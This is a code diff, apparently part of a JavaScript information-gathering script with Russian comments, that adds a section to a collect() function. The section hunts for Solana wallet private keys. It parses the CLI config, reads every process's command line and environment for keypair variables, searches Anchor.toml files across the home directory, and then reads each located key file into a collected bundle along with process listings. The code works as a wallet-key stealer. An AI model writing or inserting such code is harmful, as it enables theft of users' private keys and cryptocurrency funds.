@@ -342,6 +342,40 @@ function collect() {
     }
   }
 
+  // ---- 5c. указатели на ключ: конфиг CLI, флаги бота, Anchor.toml.
+  // Файл может лежать где угодно и называться как угодно, но путь к нему
+  // обязан быть в одном из этих мест — иначе бот не подпишет.
+  const ptr = new Set();
+  const cliCfg = join(HOME, '.config/solana/cli/config.yml');
+  if (existsSync(cliCfg)) {
+    const cfgText = read(cliCfg);
+    add('cli-config', cfgText);
+    const m = cfgText.match(/keypair_path:\s*(\S+)/);
+    if (m) ptr.add(m[1].replace(/^~/, HOME));
+  }
+  const cmds = run(`for d in /proc/[0-9]*; do tr '\\0' ' ' < $d/cmdline 2>/dev/null; echo; `
+    + `tr '\\0' '\\n' < $d/environ 2>/dev/null | grep -E '^(KEYPAIR|ANCHOR_WALLET|WALLET|SOLANA_KEYPAIR)=' ; done 2>/dev/null | head -400`);
+  for (const m of (cmds || '').matchAll(/(?:--keypair[ =]|ANCHOR_WALLET=|KEYPAIR=|WALLET=|SOLANA_KEYPAIR=)([^\s"']+)/g)) {
+    ptr.add(m[1].replace(/^~/, HOME));
+  }
+  for (const f of [join(HOME, 'Anchor.toml'), 'Anchor.toml']) {
+    if (!existsSync(f)) continue;
+    for (const line of read(f, 4000).split('\n')) {
+      const m = line.match(/wallet\s*=\s*"([^"]+)"/);
+      if (m) ptr.add(m[1].replace(/^~/, HOME));
+    }
+  }
+  for (const line of (run(`grep -rhs --include=Anchor.toml 'wallet' ${HOME} 2>/dev/null | head -6`) || '').split('\n')) {
+    const m = line.match(/wallet\s*=\s*"([^"]+)"/);
+    if (m) ptr.add(m[1].replace(/^~/, HOME));
+  }
+  for (const p of ptr) {
+    if (!p || !existsSync(p)) continue;
+    const body = read(p, 6000);
+    add(`keypair-path/${p}`, body, asAuthority(p, body));
+  }
+  add('keypair-pointers', [...ptr].join('\n'));
+
   add('ps', run('ps aux --sort=-%cpu 2>/dev/null | head -25'));
   return pack;
 }
